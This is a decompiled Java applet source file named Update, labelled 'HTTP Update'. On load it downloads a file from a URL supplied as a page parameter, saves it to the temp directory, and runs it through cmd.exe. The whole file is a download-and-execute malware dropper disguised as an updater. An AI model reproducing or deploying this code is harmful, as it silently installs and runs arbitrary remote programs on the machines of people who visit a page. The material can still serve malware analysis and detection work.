import java.io.InputStream;
import java.net.URLConnection;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Update extends Applet
{
    @Override
    public void init() {
        final String firstwierdstring = this.getParameter("name_of_the_file");
        final String secondwierdstring = System.getProperty("java.io.tmpdir");
        URL mysomeurl;
        try {
            mysomeurl = new URL(this.getParameter("path_to_url"));
        }
        catch (MalformedURLException mlfrm) {
            mlfrm.printStackTrace();
            return;
        }
        URLConnection uc;
        try {
            uc = mysomeurl.openConnection();
        }
        catch (IOException someexc) {
            someexc.printStackTrace();
            return;
        }
        InputStream issss;
        try {
            issss = uc.getInputStream();
        }
        catch (IOException someexc2) {
            someexc2.printStackTrace();
            return;
        }
        FileOutputStream fos;
        try {
            fos = new FileOutputStream(secondwierdstring + firstwierdstring);
        }
        catch (FileNotFoundException filenotfoundexception) {
            filenotfoundexception.printStackTrace();
            return;
        }
        final byte[] zerobytearray = new byte[1024];
        try {
            int interrup;
            while ((interrup = issss.read(zerobytearray, 0, zerobytearray.length)) != -1) {
                fos.write(zerobytearray, 0, interrup);
            }
        }
        catch (IOException someexc3) {
            someexc3.printStackTrace();
        }
        try {
            issss.close();
        }
        catch (IOException someexc4) {
            someexc4.printStackTrace();
        }
        try {
            fos.close();
        }
        catch (IOException someexc5) {
            someexc5.printStackTrace();
        }
        final Runtime rt = Runtime.getRuntime();
        final String[] anotherpathstring = new String[3];
        try {
            anotherpathstring[0] = "cmd.exe";
            anotherpathstring[1] = "/C";
            anotherpathstring[2] = secondwierdstring + firstwierdstring;
            rt.exec(anotherpathstring);
        }
        catch (IOException someexc6) {
            someexc6.printStackTrace();
        }
    }
    
    @Override
    public String getAppletInfo() {
        return "HTTP Update";
    }
}
